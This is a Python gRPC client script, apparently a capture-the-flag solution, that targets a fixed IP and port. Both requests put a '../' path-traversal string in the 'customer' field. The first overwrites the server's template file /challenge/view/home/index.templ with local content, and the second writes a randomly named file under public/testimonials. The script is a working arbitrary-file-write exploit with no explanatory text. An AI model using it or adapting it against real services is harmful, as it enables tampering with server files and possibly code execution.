import grpc
import ricky_service_pb2
import ricky_service_pb2_grpc
import random
import time
# Antes de ejecutar el script: python3 -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. ricky_service.proto

def read_file_content(fp):
    with open(fp, 'r') as file:
        return file.read()

def run():
    server = "94.237.59.199:43921"
    # Crear un canal gRPC para conectarse al servidor
    with grpc.insecure_channel(server) as channel:
        # Crear un stub (cliente)
        stub = ricky_service_pb2_grpc.RickyServiceStub(channel)
        
        # Crear una solicitud
        request = ricky_service_pb2.TestimonialSubmission(
            #customer="../../../../../../../../../../../../challenge/grpc.go",
            customer="../../../../../../../../../../../../challenge/view/home/index.templ",
            testimonial=read_file_content("./index.templ")
        )

        # Realizar una llamada RPC
        response = stub.SubmitTestimonial(request)
        print("Respuesta del servidor: " + response.message)

    time.sleep(1)

    # Crear un canal gRPC para conectarse al servidor
    with grpc.insecure_channel(server) as channel:
        # Crear un stub (cliente)
        stub = ricky_service_pb2_grpc.RickyServiceStub(channel)
        
        hash = "%0x32x" % random.getrandbits(128)

        # Crear una solicitud
        request = ricky_service_pb2.TestimonialSubmission(
            customer=f"../../../../../../../../../../../../challenge/public/testimonials/{hash}.html",
            testimonial="hola"
        )

        # Realizar una llamada RPC
        response = stub.SubmitTestimonial(request)
        print("Respuesta del servidor: " + response.message)

if __name__ == '__main__':
    run()
